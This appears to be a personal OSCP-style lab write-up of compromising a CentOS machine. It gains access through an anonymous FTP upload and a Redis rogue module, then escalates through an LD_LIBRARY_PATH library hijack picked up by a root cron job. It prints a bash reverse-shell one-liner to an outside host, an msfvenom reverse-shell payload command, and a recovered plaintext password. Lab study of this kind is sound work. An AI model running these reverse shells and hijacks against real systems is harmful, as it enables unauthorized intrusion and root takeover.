# System Information
OS: CentOS
IP: 192.168.167.93

---
# Service Enumeration
## 21/tcp FTP
vsftpd 3.0.2

anonymous FTP with 777 permissions on folder named "pub"

If we try another login, we get `530 This FTP server is anonymous only.`

## 22/tcp SSH

OpenSSH 7.4 (protocol 2.0)


## 80/tcp HTTP

Apache/2.4.6 (CentOS) PHP/7.3.22

robots.txt
![[Pasted image 20260830121157.png]]


![[Pasted image 20260830122525.png]]


## 6379/tcp Service

Redis key-value store 5.0.9 (64 bits)

# Initial Access
Find https://www.exploit-db.com/exploits/47195, then non-Metasploit: https://github.com/n0b0dyCN/redis-rogue-server

Upload exp.so to pub FTP folder.

`redis-cli -h $IP`

```
module load /var/ftp/pub/exp.so
system.exec "/bin/sh -i >& /dev/tcp/192.168.45.194/80 0>&1"
```

![[Pasted image 20260830122431.png]]

# Privilege Escalation

Find Pablo password in /var/www/html/config/users/pablo.ini.

![[Pasted image 20260830122730.png]]

PostureAlienateArson345

pablo isn't allowed to run sudo, and the password doesn't work for root.

linpeas highlights /usr/bin/log-sweeper and highlights that LD_LIBRARY_PATH includes non-default `/usr/local/lib/dev`. 

![[Pasted image 20260830123731.png]]

Let's put a revshell utils.so in there and wait to see if we get a connection.

`msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.194 LPORT=80 -f elf-so -o utils.so`

Upload to pub FTP, then copy to /usr/local/lib/dev

It seems log-sweeper is on a cron job, as if we wait a bit we'll get a connection as root.

![[Pasted image 20260830123802.png]]

# Proof Screenshots (local.txt / proof.txt)
`type` or `cat` flag and [include IP address in screenshot](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide#screenshot-requirements)

![[Pasted image 20260830124002.png]]